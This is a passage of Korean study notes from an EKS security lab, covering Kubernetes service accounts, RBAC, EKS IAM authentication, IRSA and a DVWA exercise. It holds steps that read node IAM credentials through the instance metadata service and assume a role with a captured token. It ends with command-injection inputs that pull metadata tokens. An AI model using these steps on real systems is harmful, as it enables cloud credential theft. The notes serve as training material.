-o jsonpath=\u0026#34;{.secrets[0].name}\u0026#34;) DevToken=$(kubectl get secret -n dev-team $DevTokenName -o jsonpath=\u0026#34;{.data.token}\u0026#34; | base64 -d) echo $DevToken 각각의 YAML파일에 토큰이 있는데 이는 JWT(Bearer)토큰으로 아래에서 확인가능 https://jwt.io/ 경우에 따라, Credential도 있기 때문에 취급주의 SA 지정하여 파드 생성 후 권한 테스트 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: v1 kind: Pod metadata: name: dev-kubectl namespace: dev-team spec: serviceAccountName: dev-k8s containers: - name: kubectl-pod image: bitnami/kubectl:1.24.10 command: [\u0026#34;tail\u0026#34;] args: [\u0026#34;-f\u0026#34;, \u0026#34;/dev/null\u0026#34;] terminationGracePeriodSeconds: 0 EOF cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: v1 kind: Pod metadata: name: infra-kubectl namespace: infra-team spec: serviceAccountName: infra-k8s containers: - name: kubectl-pod image: bitnami/kubectl:1.24.10 command: [\u0026#34;tail\u0026#34;] args: [\u0026#34;-f\u0026#34;, \u0026#34;/dev/null\u0026#34;] terminationGracePeriodSeconds: 0 EOF # 확인 kubectl get pod -o dev-kubectl -n dev-team -o yaml | grep serviceAccount kubectl get pod -o infra-kubectl -n infra-team -o yaml | grep serviceAccount # 파드에 기본 적용되는 SA 정보(토큰) kubectl exec -it dev-kubectl -n dev-team -- ls /run/secrets/kubernetes.io/serviceaccount kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/token kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/namespace kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/ca.crt # 각 파드 접속하여, 정보 확인 with alias alias k1=\u0026#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl\u0026#39; alias k2=\u0026#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl\u0026#39; # 권한 테스트 k1 get pods # kubectl exec -it dev-kubectl -n dev-team -- kubectl get pods 와 동일한 실행 명령이다! k1 run nginx --image nginx:1.20-alpine k1 get pods -n kube-system # (옵션) kubectl 실행 사용자(host 기준)가 특정 권한을 가지고 있는지 확인 [결과: no] k1 auth can-i get pods 당연히 되지 않음. 단지 SA를 만들어서 파드에 적어넣었을 뿐 Role의 부재 SA와 Role의 매핑(RoleBinding)의 부재 아래에서 위의 두 가지를 생성 # 각 NS에 Role 생성 후 확인 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: role-dev-team namespace: dev-team rules: - apiGroups: [\u0026#34;*\u0026#34;] resources: [\u0026#34;*\u0026#34;] verbs: [\u0026#34;*\u0026#34;] EOF cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: role-infra-team namespace: infra-team rules: - apiGroups: [\u0026#34;*\u0026#34;] resources: [\u0026#34;*\u0026#34;] verbs: [\u0026#34;*\u0026#34;] EOF kubectl describe roles role-dev-team -n dev-team # 각 NS에 SA와 Role 매핑(RoleBinding) 생성 후 확인 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: roleB-dev-team namespace: dev-team roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: role-dev-team subjects: - kind: ServiceAccount name: dev-k8s namespace: dev-team EOF cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: roleB-infra-team namespace: infra-team roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: role-infra-team subjects: - kind: ServiceAccount name: infra-k8s namespace: infra-team EOF kubectl describe rolebindings roleB-dev-team -n dev-team # 권한 테스트 성공 alias k1=\u0026#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl\u0026#39; alias k2=\u0026#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl\u0026#39; k1 get pods k1 run nginx --image nginx:1.20-alpine k1 get pods k1 delete pods nginx k1 get pods -n kube-system k1 get nodes k1 auth can-i get pods # yes 3. EKS 인증/인가 앞에서 k8s 인증/인가를 했다면 이제는 AWS IAM 서비스와 결합 인증: AWS IAM 인가: k8s RBAC 원활한 진행을 위해 RBAC용 krew 플러그인 설치 kubectl krew install access-matrix rbac-tool rbac-view rolesum # 실습 NS인 default에서 액세스 매트릭스 kubectl access-matrix --namespace default # USER/GROUP/SA 단위의 RBAC 조회 # system:nodes == eks:node-bootstrapper # system:bootstrappers == eks:node-bootstrapper kubectl rbac-tool lookup system:masters # USER/GROUP/SA 단위의 RBAC 정책 규칙 kubectl rbac-tool policy-rules kubectl rbac-tool policy-rules # 해당 클러스터에서 사용 가능한 클러스터롤 조회 kubectl rbac-tool show # 클러스터에 인증된 현재 컨텍스트의 사용자 kubectl rbac-tool whoami # USER/GROUP/SA 단위의 RBAC 역할 조회 kubectl rolesum aws-node -n kube-system kubectl rolesum -k User system:kube-proxy kubectl rolesum -k Group system:masters # (새로운 쉘) 현재 접속한 본인의 RBAC 권한을 시각적으로 echo -e \u0026#34;RBAC View Web http://$(curl -s ipinfo.io/ip):8800\u0026#34; kubectl rbac-view 3-1. EKS 인증/인가 살펴보기 STS(Security Token Service)를 기반 aws-cli v1.16.156부터 aws-iam-authenticator 설치 없이 get-token으로 획득 가능 kubectl ~ aws eks get-token ~ EKS Service Endpoint 요청 구조 kubectl의 Client-Go 라이브러가 Pre-Signed URL을 Tokenize하여 엔드포인트 요청 [Credential 가득함. 유의!] EKS API는 Webhook token authenticator에 Token Review Request\nAWS IAM 해당 인증을 호출 완료 후, User/Role의 ARN 반환 k8s RBAC 인가 처리 EKS configmap에서 system:masters나 system:authenticated로 예상되는 그룹 정보는 노출되지 않음 Human Error 예방 추정 kubectl rbac-tool whoami으로 조회 가능 (kubeconfig)v1beta1을 쓰고 있는데, 실습을 하다보면 간혹 token값 앞부분이 깨져나옴 To-Do: v1(GA) 이후로 해서 테스트해봐야 함 # sts caller id의 ARN aws sts get-caller-identity --query Arn # kubeconfig 정보. get-token 커맨드 삽입 확인 cat ~/.kube/config | yh # STS 임시 보안 자격 증명 토큰 요청. 시간경과 시 토큰 재발급 aws eks get-token --cluster-name $CLUSTER_NAME | jq -r \u0026#39;.status.token\u0026#39; # tokenreview, Webhook, validatingwebhookconfigurations API 리소스 kubectl api-resources | grep authentication kubectl api-resources | grep Webhook kubectl get validatingwebhookconfigurations kubectl get validatingwebhookconfigurations eks-aws-auth-configmap-validation-webhook -o yaml | kubectl neat | yh # aws-auth configmap kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh # EKS를 설치한 IAM User 정보 kubectl rbac-tool whoami # system:masters, system:authenticated 그룹 정보 kubectl rbac-tool lookup system:masters kubectl rbac-tool lookup system:authenticated kubectl rolesum -k Group system:masters kubectl rolesum -k Group system:authenticated # system:masters 그룹이 사용 가능한 ClusterRole: cluster-admin kubectl describe clusterrolebindings.rbac.authorization.k8s.io cluster-admin # cluster-admin 의 PolicyRule: 모든 리소스 사용 가능! kubectl describe clusterrole cluster-admin # system:authenticated 그룹이 사용 가능한 ClusterRole kubectl describe ClusterRole system:discovery kubectl describe ClusterRole system:public-info-viewer kubectl describe ClusterRole system:basic-user kubectl describe ClusterRole eks:podsecuritypolicy:privileged 3-2. 신규 인프라 관리자용 myeks-bastion-2에 EKS 인증/인가 설정 기존 쉘(myeks-bastion)과 교차하여 진행: testuser 생성 및 권한 수정 ## # myeks-bastion ## # testuser 생성 및 프로그래밍 방식 Access 권한 부여, 어드민 접속 정책 추가 # Access Key의 경우, 1회만 출력 -\u0026gt; 메모 aws iam create-user --user-name testuser aws iam create-access-key --user-name testuser aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name testuser # get-call-identity ARN aws sts get-caller-identity --query Arn # testuser가 접속할 myeks-bastion-2 PublicIP 확인 aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table 현재 상태에서 testuser는 접속은 가능하지만, kubectl 불가 당연하게도, 관리자 그룹(system:masters)과 매핑이 되지 않았기에 불가 ## # myeks-bastion-2 ## # testuser로 접속 ssh ec2-user@{myeks-bastion-2 PublicIP} # testuser IAM 설정 aws configure # get-call-identity ARN aws sts get-caller-identity --query Arn # kubectl 명령어 실행: 권한 없음 kubectl get node -v6 ls ~/.kube 다시, 원래 쉘에서 그룹 부여를 하여 권한 설정: EKS 관리자 레벨 ## # myeks-bastion ## eksctl create iamidentitymapping --cluster $CLUSTER_NAME --username testuser --group system:masters --arn arn:aws:iam::$ACCOUNT_ID:user/testuser # system:masters 적용 확인 # IAM 매핑 확인 시, 기존 NodeInstanceRole은 노드에 접속될 때 사용되는 IAM Role(Credential 확인 불가, 세션과 같은 느낌으로 이해) kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh eksctl get iamidentitymapping --cluster $CLUSTER_NAME 다시, testuser에서 kubectl 명령어 실행: 권한 있음 실행 전, kubeconfig 업데이트 필요 ## # myeks-bastion-2 ## # kubeconfig 업데이트(생성) aws eks update-kubeconfig --name $CLUSTER_NAME --user-alias testuser # kubeconfig에 system:masters 그룹 추가 확인 cat ~/.kube/config | yh # kubectl 실행: 권한 있음 kubectl ns default kubectl get node -v6 # rbac-tool: system:masters 그룹과 더불어 system:authenticated가 같이 설정 kubectl krew install rbac-tool \u0026amp;\u0026amp; kubectl rbac-tool whoami testuser의 그룹 재설정 (system:masters -\u0026gt; system:authenticated) 텍스트에디터로 직접 편집 (또는) iamidentitymapping 삭제 후, 다시 생성 ## # myeks-bastion ## kubectl edit cm -n kube-system aws-auth eksctl get iamidentitymapping --cluster $CLUSTER_NAME testuser에서 kubectl 명령어 실행 시도: 일부 권한 없음 확인 config 업데이트를 하지 않아도, 적용되어 있음 pods 조회는 가능하지만, nodes 조회는 불가 ## # myeks-bastion-2 ## kubectl get node -v6 kubectl api-resources -v5 물론 testuser IAM 매핑을 삭제하면, 아예 권한이 없음 ## # myeks-bastion ## # testuser IAM 맵핑 삭제 eksctl delete iamidentitymapping --cluster $CLUSTER_NAME --arn arn:aws:iam::$ACCOUNT_ID:user/testuser eksctl get iamidentitymapping --cluster $CLUSTER_NAME kubectl get cm -n kube-system aws-auth -o yaml | yh ## # myeks-bastion-2 ## kubectl get node -v6 kubectl api-resources -v5 3-3. (옵션) EC2 Instance Profile(IAM Role)에 맵핑된 k8s RBAC 확인 3-2에서 NodeInstanceRole을 중간에 확인 system:nodes username: system:node:{{EC2PrivateDNSName}} 추가 IAM 증명이 없어도, 노드에 생성된 파드에서 IMDS로 EC2 IAM Role 사용 Token 만료 전까지 이용 가능. 권한 유의 # 노드 별 hostname, sts ARN for node in $N1 $N2 $N3; do ssh ec2-user@$node hostname; done for node in $N1 $N2 $N3; do ssh ec2-user@$node aws sts get-caller-identity --query Arn; done # aws-auth ConfigMap kubectl describe configmap -n kube-system aws-auth # IAM identity mapping eksctl get iamidentitymapping --cluster $CLUSTER_NAME aws-cli(v2) 파드를 추가하여, 해당 EC2 노드의 IMDS 정보 확인 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: apps/v1 kind: Deployment metadata: name: awscli-pod spec: replicas: 2 selector: matchLabels: app: awscli-pod template: metadata: labels: app: awscli-pod spec: containers: - name: awscli-pod image: amazon/aws-cli command: [\u0026#34;tail\u0026#34;] args: [\u0026#34;-f\u0026#34;, \u0026#34;/dev/null\u0026#34;] terminationGracePeriodSeconds: 0 EOF kubectl get pod -owide # 파드 이름 변수 지정 후 각 파드에서 EC2 InstancePrfile(IAM Role) ARN 확인 APODNAME1=$(kubectl get pod -l app=awscli-pod -o jsonpath={.items[0].metadata.name}) APODNAME2=$(kubectl get pod -l app=awscli-pod -o jsonpath={.items[1].metadata.name}) echo $APODNAME1, $APODNAME2 kubectl exec -it $APODNAME1 -- aws sts get-caller-identity --query Arn kubectl exec -it $APODNAME2 -- aws sts get-caller-identity --query Arn # 추가 IAM 증명이 없어도, IMDS로 EC2 IAM Role 사용: 권한 유의 kubectl exec -it $APODNAME1 -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager kubectl exec -it $APODNAME2 -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager # aws-cli 파드에 쉘 접속 후, EC2 메타데이터 확인 kubectl exec -it $APODNAME1 -- bash curl -s http://169.254.169.254/ -v # Token 요청 curl -s -X PUT \u0026#34;http://169.254.169.254/latest/api/token\u0026#34; -H \u0026#34;X-aws-ec2-metadata-token-ttl-seconds: 21600\u0026#34; ; echo curl -s -X PUT \u0026#34;http://169.254.169.254/latest/api/token\u0026#34; -H \u0026#34;X-aws-ec2-metadata-token-ttl-seconds: 21600\u0026#34; ; echo # Token을 이용한 IMDSv2 사용 TOKEN=$(curl -s -X PUT \u0026#34;http://169.254.169.254/latest/api/token\u0026#34; -H \u0026#34;X-aws-ec2-metadata-token-ttl-seconds: 21600\u0026#34;) echo $TOKEN curl -s -H \u0026#34;X-aws-ec2-metadata-token: $TOKEN\u0026#34; –v http://169.254.169.254/ ; echo curl -s -H \u0026#34;X-aws-ec2-metadata-token: $TOKEN\u0026#34; –v http://169.254.169.254/latest/ ; echo curl -s -H \u0026#34;X-aws-ec2-metadata-token: $TOKEN\u0026#34; –v http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo # 위에서 출력된 IAM Role을 아래 입력 후 확인 curl -s -H \u0026#34;X-aws-ec2-metadata-token: $TOKEN\u0026#34; –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK # 파드 쉘 종료 exit aws-cli 파드에 kubeconfig를 통한 mapRoles 정보 생성 # node 의 IAM Role ARN을 변수로 지정 eksctl get iamidentitymapping --cluster $CLUSTER_NAME NODE_ROLE=eksctl-myeks-nodegroup-ng1-NodeInstanceRole-{IAM Role ARN} # awscli 파드에서 kubeconfig 정보 생성 # 확인 시, 실행 인자에 role도 추가되었음 kubectl exec -it $APODNAME1 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE kubectl exec -it $APODNAME1 -- cat /root/.kube/config | yh kubectl exec -it $APODNAME2 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE kubectl exec -it $APODNAME2 -- cat /root/.kube/config | yh (보너스)노드에 SSH 접속, kubeconfig 파일 생성 후 kubectl 실행 중간에 안되서 중단 했었지만, 복기하고 나니 어디가 문제인지 파악: To-Do ssh ec2-user@$N1 sudo su - # kubectl 설치 curl --silent --location \u0026#34;https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz\u0026#34; | tar xz -C /tmp mv /tmp/eksctl /usr/local/bin curl -LO \u0026#34;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\u0026#34; install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl # 정상 출력 aws sts get-caller-identity --query Arn # Token 요청: 미리 메모 aws eks get-token --cluster-name myeks | jq -r \u0026#39;.status.token\u0026#39; # 위의 토큰과 앞에서 출력된 kubeconfig를 가져와서 kubeconfig 생성 mkdir ~/.kube cat \u0026lt;\u0026lt; EOF \u0026gt; ~/.kube/config apiVersion: v1 clusters: - cluster: certificate-authority-data: LS0tL{생략}S0tCg== server: https://0A9ACECDBF06CF1E13D3E0F19A0F0D2C.sk1.ap-northeast-2.eks.amazonaws.com name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks contexts: - context: cluster: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks user: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks current-context: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks kind: Config preferences: {} users: - name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks user: exec: apiVersion: client.authentication.k8s.io/v1beta1 args: - --region - ap-northeast-2 - eks - get-token - --cluster-name - myeks - --output - json - --role - eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK command: aws EOF # kubectl 시도 kubectl get node -v6 # kubeconfig 삭제 rm -rf .kube 4. EKS IRSA 위에서 경험했듯이 EC2 Instance Profile은 편리하나, 보안상 취약(최소 권한 부여 원칙) IAM Roles for Service Accounts: 사용자 관리형 서비스 계정 실습 환경 구성 시, 아래의 스크립트가 포함 eksctl create cluster --name $CLUSTER_NAME ... --external-dns-access --full-ecr-access --asg-access 4-1. `projected\u0026rsquo; Volume k8s의 projected Volume을 활용하여, 아래의 volume source를 하나의 디렉토리로 통합 Secret: user, pass ConfigMap Downward API ServiceAccountToken 원문: https://kubernetes.io/docs/tasks/configure-pod-container/configure-projected-volume-storage/ # Create the Secrets: ## Create files containing the username and password: echo -n \u0026#34;admin\u0026#34; \u0026gt; ./username.txt echo -n \u0026#34;1f2d1e2e67df\u0026#34; \u0026gt; ./password.txt ## Package these files into secrets: kubectl create secret generic user --from-file=./username.txt kubectl create secret generic pass --from-file=./password.txt # 파드 생성 kubectl apply -f https://k8s.io/examples/pods/storage/projected.yaml # 파드 확인: projected 라벨 kubectl get pod test-projected-volume -o yaml | kubectl neat | yh # secret kubectl exec -it test-projected-volume -- ls /projected-volume/ kubectl exec -it test-projected-volume -- cat /projected-volume/username.txt ;echo kubectl exec -it test-projected-volume -- cat /projected-volume/password.txt ;echo # 삭제 kubectl delete pod test-projected-volume \u0026amp;\u0026amp; kubectl delete secret user pass 4-2. IRSA 실습 개념\nMutatingWebhook: 사용자가 요청한 request에 대해 관리자가 임의로 값을 변경 kubectl get validatingwebhookconfigurations ValidatingWebhook: 사용자가 요청한 request에 대해 관리자가 허용 차단 kubectl get mutatingwebhookconfigurations 실습1. CloudTrail 이벤트 ListBucket을 통한, Access Denied 확인\n아래 실행 후, CloudTrail 이벤트 확인 AWS 링크 userIdentity # 파드1 생성 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: eks-iam-test1 spec: containers: - name: my-aws-cli image: amazon/aws-cli:latest args: [\u0026#39;s3\u0026#39;, \u0026#39;ls\u0026#39;] restartPolicy: Never automountServiceAccountToken: false EOF # 확인 kubectl get pod kubectl describe pod # 로그 확인 kubectl logs eks-iam-test1 # 파드1 삭제 kubectl delete pod eks-iam-test1 실습2. k8s SA \u0026amp; JWT token SA 생성 시, k8s secret에 JWT token이 자동 생성 EKS IdP(OpentID Connect Provider) 주소: k8s가 발급한 Token 유효 검증 # 파드2 생성 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: eks-iam-test2 spec: containers: - name: my-aws-cli image: amazon/aws-cli:latest command: [\u0026#39;sleep\u0026#39;, \u0026#39;36000\u0026#39;] restartPolicy: Never EOF kubectl get pod kubectl describe pod # aws 서비스 사용 시도 kubectl exec -it eks-iam-test2 -- aws s3 ls # 서비스 어카운트 토큰 SA_TOKEN=$(kubectl exec -it eks-iam-test2 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token) echo $SA_TOKEN # jwt 혹은 JWT 웹 사이트 이용 jwt decode $SA_TOKEN --json --iso8601 # 파드2 삭제 kubectl delete pod eks-iam-test2 실습3. amazon-eks-pod-identity-webhook을 통한 파드 IAM access 주입(mutating pods) 아래의 예제에서는 EKS 상의 LB Controller가 AWS 서비스에 접근하여 LB를 제어 따라서 LB Controller가 이용하는 SA에도 관련 IAM Role을 주입 LB Controller는 kube-system Namespace에서 동작 \u0026amp; LB Controller SA 이용 Webhook이 LB Controller Pod spec에 정보를 주입, 변경(mutating) 해당 Trust Relationship에서는 인증방법(sts:AssumeRoleWithWebIdentity)이 기재 JWT Token 내 포함되야하는 Claim 조건1: aud는 sts.amazonaws.com JWT Token 내 포함되야하는 Claim 조건2: sub는 system:serviceaccount:kube-system:aws-load-balancer-controller OIDC Discovery end-point? OpenID Connect Discovery RFC is the specification that defines the structure and content of the OIDC .well-known end-point. OPEN BANKING 참고: Ssup2 Blog # eksctl create iamserviceaccount: SA \u0026amp; IAM role \u0026amp; trust policy 동시 생성 # CloudFormation Stack -\u0026gt; IAM Role 확인 가능 eksctl create iamserviceaccount \\ --name my-sa \\ --namespace default \\ --cluster $CLUSTER_NAME \\ --approve \\ --attach-policy-arn $(aws iam list-policies --query \u0026#39;Policies[?PolicyName==`AmazonS3ReadOnlyAccess`].Arn\u0026#39; --output text) # aws-load-balancer-controller IRSA의 동작 수행을 예상해야 함 eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl get sa kubectl describe sa my-sa ## SA를 기반으로한 신규 파드 생성 # 파드3번 생성 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: eks-iam-test3 spec: serviceAccountName: my-sa containers: - name: my-aws-cli image: amazon/aws-cli:latest command: [\u0026#39;sleep\u0026#39;, \u0026#39;36000\u0026#39;] restartPolicy: Never EOF # 해당 SA를 파드가 사용 시 mutatingwebhook으로 Env,Volume 추가함 kubectl get mutatingwebhookconfigurations pod-identity-webhook -o yaml | kubectl neat | yh ## 파드 생성 yaml에 새로운 내용 추가 확인 # Pod Identity Webhook은 mutating webhook을 통해 Environment 및 1개의 Projected 볼륨 추가 # Environment.{AWS_ROLE_ARN | AWS_WEB_IDENTITY_TOKEN_FILE} # Volume.aws-iam-token kubectl get pod eks-iam-test3 kubectl describe pod eks-iam-test3 ## 파드에서 aws-cli 사용 # 몇 가지는 구동이 안되었는데, 아직 이해가 부족하여 추후에 다시 확인 필요 (To-Do) # VPC의 경우, 권한이 없어서 안되는 것으로 추측 eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl exec -it eks-iam-test3 -- aws sts get-caller-identity --query Arn\\ kubectl exec -it eks-iam-test3 -- aws s3 ls kubectl exec -it eks-iam-test3 -- aws ec2 describe-instances --region ap-northeast-2 kubectl exec -it eks-iam-test3 -- aws ec2 describe-vpcs --region ap-northeast-2 # 파드에 볼륨 마운트 2개 확인: aws-iam-token kubectl get pod eks-iam-test3 -o json | jq -r \u0026#39;.spec.containers | .[].volumeMounts\u0026#39; # aws-iam-token 볼륨 정보 확인 : JWT 토큰이 담겨져있고, exp, aud 속성이 추가되어 있음 kubectl get pod eks-iam-test3 -o json | jq -r \u0026#39;.spec.volumes[] | select(.name==\u0026#34;aws-iam-token\u0026#34;)\u0026#39; # API 리소스: mutatingwebhookconfigurations, validatingwebhookconfigurations kubectl api-resources |grep hook kubectl get MutatingWebhookConfiguration kubectl describe MutatingWebhookConfiguration pod-identity-webhook kubectl get MutatingWebhookConfiguration pod-identity-webhook -o yaml | yh # AWS_WEB_IDENTITY_TOKEN_FILE 확인 IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token) echo $IAM_TOKEN # Discovery Endpoint 접근 IDP=$(aws eks describe-cluster --name myeks --query cluster.identity.oidc.issuer --output text) curl -s $IDP/.well-known/openid-configuration | jq -r \u0026#39;.\u0026#39; curl -s $IDP/keys | jq -r \u0026#39;.\u0026#39; # 공개키가 포함된 JWKS 필드 실습 4. IRSA를 가장 취약하게 사용하는 방법 정보 탈취 시 키/토큰 발급 악용 가능. 라이브 서비스로는 시도 금물 위의 실습 3에 바로 이어서 진행 # AWS_WEB_IDENTITY_TOKEN_FILE 토큰 값 변수 지정 IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token) echo $IAM_TOKEN # ROLE ARN 확인 후 변수 직접 지정 eksctl get iamserviceaccount --cluster $CLUSTER_NAME ROLE_ARN=arn:aws:iam::911283464785:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-{arn} # assume-role-with-web-identity STS 임시자격증명 발급 요청 aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --role-session-name mykey --web-identity-token $IAM_TOKEN | jq # 파드 삭제 kubectl delete pod eks-iam-test3 5. OWAPS k8s Top 10 실습에서는 세 가지 시나리오로 k8s 보안위협 체감을 목표로 진행 마지막 5-3 실습의 경우 기존 kubeconfig를 삭제하기 때문에\ncloudformation stack 삭제 시, 수동 작업 필요할 수 있음 5-1. 실습1: EKS pod가 IMDS API를 악용하는 시나리오 DVWA 활용: mysql, dvwa, ingress 배포 후 웹에서 확인까지 대기 시간 소요 # mysql 배포 cat \u0026lt;\u0026lt;EOT \u0026gt; mysql.yaml apiVersion: v1 kind: Secret metadata: name: dvwa-secrets type: Opaque data: # s3r00tpa55 ROOT_PASSWORD: czNyMDB0cGE1NQ== # dvwa DVWA_USERNAME: ZHZ3YQ== # p@ssword DVWA_PASSWORD: cEBzc3dvcmQ= # dvwa DVWA_DATABASE: ZHZ3YQ== --- apiVersion: v1 kind: Service metadata: name: dvwa-mysql-service spec: selector: app: dvwa-mysql tier: backend ports: - protocol: TCP port: 3306 targetPort: 3306 --- apiVersion: apps/v1 kind: Deployment metadata: name: dvwa-mysql spec: replicas: 1 selector: matchLabels: app: dvwa-mysql tier: backend template: metadata: labels: app: dvwa-mysql tier: backend spec: containers: - name: mysql image: mariadb:10.1 resources: requests: cpu: \u0026#34;0.3\u0026#34; memory: 256Mi limits: cpu: \u0026#34;0.3\u0026#34; memory: 256Mi ports: - containerPort: 3306 env: - name: MYSQL_ROOT_PASSWORD valueFrom: secretKeyRef: name: dvwa-secrets key: ROOT_PASSWORD - name: MYSQL_USER valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_USERNAME - name: MYSQL_PASSWORD valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_PASSWORD - name: MYSQL_DATABASE valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_DATABASE EOT kubectl apply -f mysql.yaml # DVWA 배포 cat \u0026lt;\u0026lt;EOT \u0026gt; dvwa.yaml apiVersion: v1 kind: ConfigMap metadata: name: dvwa-config data: RECAPTCHA_PRIV_KEY: \u0026#34;\u0026#34; RECAPTCHA_PUB_KEY: \u0026#34;\u0026#34; SECURITY_LEVEL: \u0026#34;low\u0026#34; PHPIDS_ENABLED: \u0026#34;0\u0026#34; PHPIDS_VERBOSE: \u0026#34;1\u0026#34; PHP_DISPLAY_ERRORS: \u0026#34;1\u0026#34; --- apiVersion: v1 kind: Service metadata: name: dvwa-web-service spec: selector: app: dvwa-web type: ClusterIP ports: - protocol: TCP port: 80 targetPort: 80 --- apiVersion: apps/v1 kind: Deployment metadata: name: dvwa-web spec: replicas: 1 selector: matchLabels: app: dvwa-web template: metadata: labels: app: dvwa-web spec: containers: - name: dvwa image: cytopia/dvwa:php-8.1 ports: - containerPort: 80 resources: requests: cpu: \u0026#34;0.3\u0026#34; memory: 256Mi limits: cpu: \u0026#34;0.3\u0026#34; memory: 256Mi env: - name: RECAPTCHA_PRIV_KEY valueFrom: configMapKeyRef: name: dvwa-config key: RECAPTCHA_PRIV_KEY - name: RECAPTCHA_PUB_KEY valueFrom: configMapKeyRef: name: dvwa-config key: RECAPTCHA_PUB_KEY - name: SECURITY_LEVEL valueFrom: configMapKeyRef: name: dvwa-config key: SECURITY_LEVEL - name: PHPIDS_ENABLED valueFrom: configMapKeyRef: name: dvwa-config key: PHPIDS_ENABLED - name: PHPIDS_VERBOSE valueFrom: configMapKeyRef: name: dvwa-config key: PHPIDS_VERBOSE - name: PHP_DISPLAY_ERRORS valueFrom: configMapKeyRef: name: dvwa-config key: PHP_DISPLAY_ERRORS - name: MYSQL_HOSTNAME value: dvwa-mysql-service - name: MYSQL_DATABASE valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_DATABASE - name: MYSQL_USERNAME valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_USERNAME - name: MYSQL_PASSWORD valueFrom: secretKeyRef: name: dvwa-secrets key: DVWA_PASSWORD EOT kubectl apply -f dvwa.yaml # ingress 배포 cat \u0026lt;\u0026lt;EOT \u0026gt; dvwa-ingress.yaml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: annotations: alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/ssl-redirect: \u0026#34;443\u0026#34; alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/target-type: ip name: ingress-dvwa spec: ingressClassName: alb rules: - host: dvwa.$MyDomain http: paths: - backend: service: name: dvwa-web-service port: number: 80 path: / pathType: Prefix EOT kubectl apply -f dvwa-ingress.yaml echo -e \u0026#34;DVWA Web https://dvwa.$MyDomain\u0026#34; 웹 접속 admin / password -\u0026gt; DB 구성을 위해 클릭 (재로그인) -\u0026gt; admin / password Command Injection 메뉴에서 아래의 명령 실행 # 명령 실행 가능 확인 8.8.8.8 ; echo ; hostname 8.8.8.8 ; echo ; whoami # IMDSv2 토큰 확인 후 복사 8.8.8.8 ; curl -s -X PUT \u0026#34;http://169.254.169.254/latest/api/token\u0026#34; -H \u0026#34;X-aws-ec2-metadata-token-ttl-seconds: 21600\u0026#34; # EC2 Instance Profile (IAM Role) 이름 확인 